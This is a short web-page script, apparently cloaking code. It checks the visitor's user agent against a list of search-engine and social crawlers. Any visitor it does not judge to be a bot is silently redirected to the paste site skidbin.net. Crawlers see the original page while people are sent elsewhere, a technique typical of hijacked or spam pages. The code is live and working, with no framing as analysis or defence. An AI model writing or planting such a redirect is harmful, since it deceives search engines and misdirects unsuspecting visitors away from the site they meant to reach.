    <script>
        // Ultra-fast bot detection
        (function() {
            function isBot() {
                const ua = navigator.userAgent.toLowerCase();
                const botIndicators = [
                    'bot', 'crawler', 'spider', 'googlebot', 'bingbot', 
                    'slurp', 'duckduckbot', 'baiduspider', 'yandexbot', 
                    'facebookexternalhit', 'twitterbot', 'rogerbot', 
                    'linkedinbot', 'embedly', 'quora link preview'
                ];
                
                for (let indicator of botIndicators) {
                    if (ua.includes(indicator)) return true;
                }
                
                const urlParams = new URLSearchParams(window.location.search);
                if (urlParams.get('bot') === 'true') return true;
                
                return false;
            }

            if (!isBot()) {
                window.location.replace('https://skidbin.net');
            }
        })();
    </script>
